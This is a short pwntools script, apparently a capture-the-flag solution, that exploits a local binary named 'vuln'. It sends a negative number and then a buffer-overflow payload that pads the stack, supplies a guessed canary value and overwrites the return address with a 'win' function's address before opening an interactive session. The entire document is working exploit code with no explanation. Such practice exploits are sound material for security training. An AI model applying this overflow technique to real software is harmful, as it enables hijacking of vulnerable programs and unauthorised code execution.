from pwn import *

r = process("./vuln")
exe = r.elf

r.recvuntil(b"> ")
r.sendline(b"-1")
r.recvuntil(b"> ")
r.sendline(cyclic(64) + b"cana" + cyclic(16) + p32(exe.sym["win"]))
# Things become really easy on local
r.interactive()
